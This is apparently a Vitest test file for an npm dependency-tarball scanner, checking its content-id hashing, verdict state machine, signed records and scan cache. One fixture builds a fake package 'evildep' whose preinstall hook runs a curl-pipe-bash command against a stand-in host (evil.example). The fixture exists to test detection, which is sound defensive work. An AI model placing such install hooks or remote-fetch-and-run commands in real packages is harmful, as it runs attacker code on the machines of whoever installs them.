import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { gzipSync } from 'node:zlib'
import { runIntelAnalysis } from '../../../src/scanner/intel/index'
import { InMemoryContentIntelStore } from '../../../src/scanner/intel/content-intel/store'
import { deriveContentId, normalizeIntegrity, verifyBufferAgainstIntegrity, sha512Hex } from '../../../src/scanner/intel/content-intel/identity'
import {
  nextState,
  ContentIntelTransitionError,
  stateFromRisk,
  stateToRisk,
  isDecisiveState,
  isPendingState,
} from '../../../src/scanner/intel/content-intel/state'
import {
  signRecord,
  verifyRecord,
  touchRecord,
  needsRevalidation,
  isCacheHit,
  revokedRecord,
} from '../../../src/scanner/intel/content-intel/record'
import type { PRFile } from '../../../src/scanner/rules'
import type { ContentIntelRecord } from '../../../src/scanner/intel/content-intel/record'

function createTarBuffer(files: { name: string; content: string }[]): Buffer {
  const blocks: Buffer[] = []
  for (const file of files) {
    const nameBuf = Buffer.alloc(100)
    nameBuf.write(file.name.slice(0, 99), 'utf-8')
    const sizeBuf = Buffer.from(file.content.length.toString(8).padStart(11, '0') + ' ', 'utf-8')
    const modeBuf = Buffer.from('0000644 ', 'utf-8')
    const uidBuf = Buffer.from('0000000 ', 'utf-8')
    const gidBuf = Buffer.from('0000000 ', 'utf-8')
    const mtimeBuf = Buffer.from('00000000000 ', 'utf-8')
    const typeFlag = Buffer.from([48])
    const linknameBuf = Buffer.alloc(100)
    const magicBuf = Buffer.from('ustar\0', 'utf-8')
    const versionBuf = Buffer.from('00', 'utf-8')
    const unameBuf = Buffer.alloc(32)
    const gnameBuf = Buffer.alloc(32)
    const devmajorBuf = Buffer.from('0000000 ', 'utf-8')
    const devminorBuf = Buffer.from('0000000 ', 'utf-8')
    const prefixBuf = Buffer.alloc(155)
    const paddingBuf = Buffer.alloc(12)
    const header = Buffer.concat([
      nameBuf, modeBuf, uidBuf, gidBuf, sizeBuf, mtimeBuf,
      Buffer.alloc(8), typeFlag, linknameBuf, magicBuf, versionBuf,
      unameBuf, gnameBuf, devmajorBuf, devminorBuf, prefixBuf, paddingBuf,
    ])
    let chksum = 0
    for (let i = 0; i < 512; i++) {
      if (i >= 148 && i < 156) chksum += 32
      else chksum += header[i]
    }
    header.write(chksum.toString(8).padStart(6, '0'), 148, 'utf-8')
    header[154] = 0x20
    header[155] = 0x20
    blocks.push(header)
    const contentBuf = Buffer.from(file.content, 'utf-8')
    blocks.push(contentBuf)
    const padLen = 512 - (contentBuf.length % 512)
    if (padLen < 512) blocks.push(Buffer.alloc(padLen))
  }
  blocks.push(Buffer.alloc(512))
  blocks.push(Buffer.alloc(512))
  return Buffer.concat(blocks)
}

const payloadTar = gzipSync(createTarBuffer([
  { name: 'package/package.json', content: JSON.stringify({ name: 'evildep', version: '1.0.0', scripts: { preinstall: 'node setup.mjs' } }) },
  { name: 'package/setup.mjs', content: "import { execSync } from 'node:child_process';\nexecSync('curl -s https://evil.example/p | bash');" },
]))

function makeFile(overrides: Partial<PRFile> & { filename: string }): PRFile {
  return { status: 'modified', additions: 10, deletions: 0, patch: '', contents_url: '', ...overrides }
}

let bodyReads = 0

function mockRegistry(entries: Record<string, { json?: unknown; tarball?: Buffer }>): ReturnType<typeof vi.fn> {
  const byLen = (a: string, b: string) => b.length - a.length
  const tarballKeys = Object.keys(entries).filter(k => entries[k].tarball).sort(byLen)
  const jsonKeys = Object.keys(entries).filter(k => entries[k].json !== undefined).sort(byLen)
  return vi.fn(async (input: RequestInfo | URL) => {
    const url = String(input)
    for (const key of tarballKeys) {
      if (url.includes(key)) {
        const buf = entries[key].tarball!
        const source = new ReadableStream<Uint8Array>({
          start(c) { c.enqueue(new Uint8Array(buf)); c.close() },
        })
        const counted = new TransformStream<Uint8Array, Uint8Array>({
          transform(chunk, c) { bodyReads += chunk.byteLength; c.enqueue(chunk) },
        })
        return new Response(source.pipeThrough(counted), {
          status: 200,
          headers: { 'content-type': 'application/octet-stream', 'content-length': String(buf.length) },
        })
      }
    }
    for (const key of jsonKeys) {
      if (url.includes(key)) return new Response(JSON.stringify(entries[key].json), { status: 200, headers: { 'content-type': 'application/json' } })
    }
    return new Response('not found', { status: 404 })
  })
}

function sriFor(buf: Buffer): string {
  return `sha512-${Buffer.from(sha512Hex(buf), 'hex').toString('base64')}`
}

let fetchMock: ReturnType<typeof vi.fn>

function noIdRegistry(): Record<string, { json?: unknown; tarball?: Buffer }> {
  return {
    'noiddep/-/noiddep-1.0.0.tgz': { tarball: payloadTar },
    'registry.npmjs.org/noiddep': { json: { versions: { '1.0.0': {} } } },
  }
}

function setupRegistry(entries: Record<string, { json?: unknown; tarball?: Buffer }>): void {
  fetchMock = mockRegistry(entries)
  vi.stubGlobal('fetch', fetchMock)
}

function registryFor(integrity: string): Record<string, { json?: unknown; tarball?: Buffer }> {
  return {
    'evildep/-/evildep-1.0.0.tgz': { tarball: payloadTar },
    'registry.npmjs.org/evildep': {
      json: { versions: { '1.0.0': { dist: { integrity } } } },
    },
  }
}

function tamperRegistryFor(integrity: string): Record<string, { json?: unknown; tarball?: Buffer }> {
  return {
    'tamperdep/-/tamperdep-1.0.0.tgz': { tarball: payloadTar },
    'registry.npmjs.org/tamperdep': {
      json: { versions: { '1.0.0': { dist: { integrity } } } },
    },
  }
}

beforeEach(() => {
  vi.stubEnv('SENTINEL_TARBALL_SCAN', '1')
  bodyReads = 0
})

afterEach(() => {
  vi.unstubAllEnvs()
  vi.unstubAllGlobals()
})

const KEY = Buffer.from('a'.repeat(64), 'hex')
const SCANNER = 'test-scanner-1'

function evidence() {
  return {
    risk: 'critical' as const,
    filesChanged: 2,
    newDomains: ['evil.example'],
    newNetworkCalls: 1,
    newCapabilities: ['Shell'],
    newScripts: ['package/setup.mjs'],
    newBinaries: [],
    lifecycleScripts: [{ script: 'preinstall', command: 'node setup.mjs', dangerous: true }],
    summary: '2 files, 1 domains, 1 install scripts',
    findings: [],
  }
}

// ---------------------------------------------------------------------------
// identity
// ---------------------------------------------------------------------------
describe('content-intel: identity', () => {
  it('derives a stable content id from bytes (sha512)', () => {
    const a = deriveContentId(payloadTar)
    expect(a.startsWith('sha512:')).toBe(true)
    expect(a).toBe(deriveContentId(payloadTar))
    expect(a).not.toBe(deriveContentId(Buffer.from('other')))
    expect(a.slice('sha512:'.length)).toHaveLength(128)
  })

  it('normalizes npm SRI (sha512-base64) to the canonical content id', () => {
    const contentId = deriveContentId(payloadTar)
    const hex = contentId.slice('sha512:'.length)
    const sri = `sha512-${Buffer.from(hex, 'hex').toString('base64')}`
    expect(normalizeIntegrity(sri)).toBe(contentId)
    expect(normalizeIntegrity(contentId)).toBe(contentId)
  })

  it('rejects wrong algorithm, malformed and empty integrity', () => {
    expect(normalizeIntegrity('sha256-abc')).toBeNull()
    expect(normalizeIntegrity('md5-abc')).toBeNull()
    expect(normalizeIntegrity('')).toBeNull()
    expect(normalizeIntegrity(null)).toBeNull()
    expect(normalizeIntegrity('sha512-not-base64!!')).toBeNull()
  })

  it('verifies downloaded bytes against the SRI', () => {
    expect(verifyBufferAgainstIntegrity(payloadTar, sriFor(payloadTar))).toBe(true)
    expect(verifyBufferAgainstIntegrity(Buffer.from('tampered'), sriFor(payloadTar))).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// state machine
// ---------------------------------------------------------------------------
describe('content-intel: state machine', () => {
  it('walks UNKNOWN -> SCANNING -> verdict -> REVOKED', () => {
    expect(nextState('UNKNOWN', 'scan_started')).toBe('SCANNING')
    expect(nextState('SCANNING', 'verdict_malicious')).toBe('MALICIOUS')
    expect(nextState('MALICIOUS', 'revoke')).toBe('REVOKED')
  })

  it('allows a direct verdict from UNKNOWN', () => {
    expect(nextState('UNKNOWN', 'verdict_safe')).toBe('KNOWN_SAFE')
    expect(nextState('UNKNOWN', 'verdict_suspicious')).toBe('SUSPICIOUS')
  })

  it('revalidation can correct a MALICIOUS verdict', () => {
    expect(nextState('MALICIOUS', 'rescan')).toBe('SCANNING')
    expect(nextState('SCANNING', 'verdict_safe')).toBe('KNOWN_SAFE')
  })

  it('throws on an invalid transition', () => {
    expect(() => nextState('UNKNOWN', 'revoke')).toThrow(ContentIntelTransitionError)
    expect(() => nextState('SCANNING', 'revoke')).toThrow(ContentIntelTransitionError)
  })

  it('maps risk -> verdict and verdict -> risk', () => {
    expect(stateFromRisk('critical')).toBe('MALICIOUS')
    expect(stateFromRisk('high')).toBe('SUSPICIOUS')
    expect(stateFromRisk('medium')).toBe('SUSPICIOUS')
    expect(stateFromRisk('low')).toBe('KNOWN_SAFE')
    expect(stateToRisk('MALICIOUS')).toBe('critical')
    expect(stateToRisk('REVOKED')).toBe('critical')
    expect(stateToRisk('UNKNOWN')).toBeNull()
    expect(isDecisiveState('KNOWN_SAFE')).toBe(true)
    expect(isPendingState('SCANNING')).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// signed records
// ---------------------------------------------------------------------------
describe('content-intel: signed records', () => {
  it('sign/verify roundtrip and tamper detection', () => {
    const rec = signRecord({
      contentId: deriveContentId(payloadTar),
      state: 'MALICIOUS',
      stateSince: 1,
      firstSeen: 1,
      lastSeen: 1,
      seenInRepoCount: 1,
      seenRepoKeys: ['a/b'],
      scannerVersion: SCANNER,
      verified: true,
      evidence: evidence(),
      signer: '',
    }, KEY, 'sentinel-oracle')
    expect(rec.signature).toBeTruthy()
    expect(verifyRecord(rec, KEY)).toBe(true)
    expect(verifyRecord({ ...rec, state: 'KNOWN_SAFE' }, KEY)).toBe(false)
  })

  it('touchRecord counts distinct repos and updates lastSeen', () => {
    const rec = signRecord({
      contentId: deriveContentId(payloadTar),
      state: 'KNOWN_SAFE',
      stateSince: 1,
      firstSeen: 1,
      lastSeen: 1,
      seenInRepoCount: 1,
      seenRepoKeys: ['a/b'],
      scannerVersion: SCANNER,
      verified: true,
      evidence: evidence(),
      signer: '',
    }, KEY, 'sentinel-oracle')
    const t1 = touchRecord(rec, 'a/b', 2)
    expect(t1.seenInRepoCount).toBe(1)
    expect(t1.lastSeen).toBe(2)
    const t2 = touchRecord(t1, 'c/d', 3)
    expect(t2.seenInRepoCount).toBe(2)
  })

  it('revalidation on scannerVersion bump, age, and pending state', () => {
    const rec = signRecord({
      contentId: deriveContentId(payloadTar),
      state: 'KNOWN_SAFE',
      stateSince: 100,
      firstSeen: 100,
      lastSeen: 100,
      seenInRepoCount: 1,
      seenRepoKeys: [],
      scannerVersion: SCANNER,
      verified: true,
      evidence: evidence(),
      signer: '',
    }, KEY, 'sentinel-oracle')
    expect(needsRevalidation(rec, SCANNER, 1000, 200)).toBe(false)
    expect(needsRevalidation(rec, 'newer-scanner', 1000, 200)).toBe(true)
    expect(needsRevalidation(rec, SCANNER, 50, 200)).toBe(true)
    expect(needsRevalidation({ ...rec, state: 'SCANNING' }, SCANNER, 1000, 200)).toBe(true)
  })

  it('a cache hit requires a verified decisive verdict', () => {
    const rec: ContentIntelRecord = signRecord({
      contentId: deriveContentId(payloadTar),
      state: 'KNOWN_SAFE',
      stateSince: 100,
      firstSeen: 100,
      lastSeen: 100,
      seenInRepoCount: 1,
      seenRepoKeys: [],
      scannerVersion: SCANNER,
      verified: true,
      evidence: evidence(),
      signer: '',
    }, KEY, 'sentinel-oracle')
    expect(isCacheHit(rec, SCANNER, 1000, 200)).toBe(true)
    expect(isCacheHit({ ...rec, verified: false }, SCANNER, 1000, 200)).toBe(false)
    expect(isCacheHit({ ...rec, state: 'SCANNING' }, SCANNER, 1000, 200)).toBe(false)
    expect(isCacheHit(null, SCANNER, 1000, 200)).toBe(false)
  })

  it('revoke transitions a decisive record', () => {
    const rec = signRecord({
      contentId: deriveContentId(payloadTar),
      state: 'KNOWN_SAFE',
      stateSince: 1,
      firstSeen: 1,
      lastSeen: 1,
      seenInRepoCount: 0,
      seenRepoKeys: [],
      scannerVersion: SCANNER,
      verified: true,
      evidence: evidence(),
      signer: '',
    }, KEY, 'sentinel-oracle')
    const revoked = revokedRecord(rec, SCANNER, 2)
    expect(revoked.state).toBe('REVOKED')
  })
})

// ---------------------------------------------------------------------------
// store
// ---------------------------------------------------------------------------
describe('content-intel: store', () => {
  it('records a verdict, transitions on re-record, and never lets a tampered row be read', () => {
    const store = new InMemoryContentIntelStore(KEY, 'sentinel-oracle')
    const id = deriveContentId(payloadTar)
    const r1 = store.record(id, 'MALICIOUS', evidence(), { repoKey: 'a/b' })
    expect(store.lookup(id)?.state).toBe('MALICIOUS')
    expect(r1.seenInRepoCount).toBe(1)
    const r2 = store.record(id, 'MALICIOUS', evidence(), { repoKey: 'c/d' })
    expect(r2.state).toBe('MALICIOUS')
    expect(r2.seenInRepoCount).toBe(2)
    expect(r2.firstSeen).toBe(r1.firstSeen)
    const revoked = store.revoke(id)
    expect(revoked?.state).toBe('REVOKED')
    expect(isCacheHit(store.lookup(id), SCANNER)).toBe(false)
    const tampered = store.lookup(id)!
    store.put({ ...tampered, state: 'KNOWN_SAFE', signature: 'deadbeef' })
    expect(store.lookup(id)).toBeNull()
  })
})

// ---------------------------------------------------------------------------
// e2e: miss -> verdict recorded -> hit (no download)
// ---------------------------------------------------------------------------
describe('content-intel: e2e tarball cache', () => {
  it('first scan misses and records a verdict; second scan hits with identical findings and zero bytes', async () => {
    const store = new InMemoryContentIntelStore(KEY, 'sentinel-oracle')
    const files = [makeFile({ filename: 'package.json', patch: '+"evildep": "1.0.0"' })]
    const integrity = sriFor(payloadTar)

    setupRegistry(registryFor(integrity))
    const first = await runIntelAnalysis(files, { tarballScan: true, contentIntelStore: store, repoKey: 'a/b' })
    expect(first.tarballScanTelemetry!.cacheHits).toBe(0)
    expect(first.tarballScanTelemetry!.packagesScanned).toBe(1)
    expect(bodyReads).toBe(payloadTar.length)
    expect(first.dependencyTarballFindings!.length).toBeGreaterThan(0)

    setupRegistry(registryFor(integrity))
    const second = await runIntelAnalysis(files, { tarballScan: true, contentIntelStore: store, repoKey: 'a/b' })
    expect(second.tarballScanTelemetry!.cacheHits).toBe(1)
    expect(second.tarballScanTelemetry!.packagesScanned).toBe(0)
    expect(second.tarballScanTelemetry!.bytesDownloaded).toBe(0)
    expect(second.tarballScanTelemetry!.downloadMs).toBe(0)
    expect(second.dependencyTarballFindings).toEqual(first.dependencyTarballFindings)
    expect(second.dependencyDelta).toEqual(first.dependencyDelta)
    expect(bodyReads).toBe(payloadTar.length)
  })

  it('a different repo touch increments the seen-in-repos counter', async () => {
    const store = new InMemoryContentIntelStore(KEY, 'sentinel-oracle')
    const files = [makeFile({ filename: 'package.json', patch: '+"evildep": "1.0.0"' })]
    const integrity = sriFor(payloadTar)

    setupRegistry(registryFor(integrity))
    await runIntelAnalysis(files, { tarballScan: true, contentIntelStore: store, repoKey: 'a/b' })
    setupRegistry(registryFor(integrity))
    await runIntelAnalysis(files, { tarballScan: true, contentIntelStore: store, repoKey: 'c/d' })

    const id = deriveContentId(payloadTar)
    expect(store.lookup(id)!.seenInRepoCount).toBe(2)
  })

  it('an integrity mismatch is never cached and raises a finding', async () => {
    const store = new InMemoryContentIntelStore(KEY, 'sentinel-oracle')
    const files = [makeFile({ filename: 'package.json', patch: '+"tamperdep": "1.0.0"' })]

    // Registry asserts a hash that does NOT match the served tarball.
    setupRegistry(tamperRegistryFor(sriFor(Buffer.from('different-bytes'))))
    const first = await runIntelAnalysis(files, { tarballScan: true, contentIntelStore: store, repoKey: 'a/b' })
    expect(first.dependencyTarballFindings!.some(f => f.title === 'Dependency tarball integrity mismatch')).toBe(true)

    // Nothing was cached: a third scan still downloads.
    setupRegistry(tamperRegistryFor(sriFor(Buffer.from('different-bytes'))))
    await runIntelAnalysis(files, { tarballScan: true, contentIntelStore: store, repoKey: 'a/b' })
    expect(bodyReads).toBe(payloadTar.length * 2)
  })

  it('without dist.integrity the cache is a silent no-op (identity unavailable)', async () => {
    const store = new InMemoryContentIntelStore(KEY, 'sentinel-oracle')
    const files = [makeFile({ filename: 'package.json', patch: '+"noiddep": "1.0.0"' })]

    setupRegistry(noIdRegistry())
    const first = await runIntelAnalysis(files, { tarballScan: true, contentIntelStore: store, repoKey: 'a/b' })
    expect(first.tarballScanTelemetry!.cacheHits).toBe(0)
    expect(first.dependencyTarballFindings!.length).toBeGreaterThan(0)

    setupRegistry(noIdRegistry())
    const second = await runIntelAnalysis(files, { tarballScan: true, contentIntelStore: store, repoKey: 'a/b' })
    expect(second.tarballScanTelemetry!.cacheHits).toBe(0)
    expect(second.dependencyTarballFindings).toEqual(first.dependencyTarballFindings)
    expect(bodyReads).toBe(payloadTar.length * 2)
  })
})
